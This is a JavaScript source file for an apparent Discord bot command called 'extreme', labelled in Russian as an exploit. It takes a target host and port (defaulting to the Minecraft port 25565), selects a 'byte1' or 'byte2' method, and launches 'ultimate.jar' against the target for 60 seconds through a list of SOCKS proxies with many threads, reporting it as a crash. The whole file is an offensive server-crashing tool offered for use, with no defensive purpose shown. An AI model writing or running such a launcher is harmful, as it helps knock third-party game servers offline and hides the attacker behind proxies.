/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');

module.exports = new Command({
    name: "extreme",
    description: "Эксплоит extreme",
    permissions: "SEND_MESSAGES",
    async execute(client, args, message){
        const iphost = args[1].split(":").slice(0,1);
        const port = args[1].split(":") [1] || 25565;
        const typee = args[2];
        var type = "";
        
        if(!typee) return errorembed("Выберете один из подметодов (Доступные: 'byte1', 'byte2')");
        if(typee == "byte1".toLowerCase()) type = "byte1"
        else if(typee == "byte2".toLowerCase()) type = "byte2"
        else return;

        if(!args[3]){ 
            runjar("ultimate.jar", `host=${iphost} port=${port} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`, true);
            runcrash(`Extreme 💥`, iphost, port, true);
        }
        if(args[3] == "manualstop"){
             runjar("ultimate.jar", `host=${iphost} port=${port} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`, false);
             runcrash(`Extreme 💥`, iphost, port, false);
        }
    }
});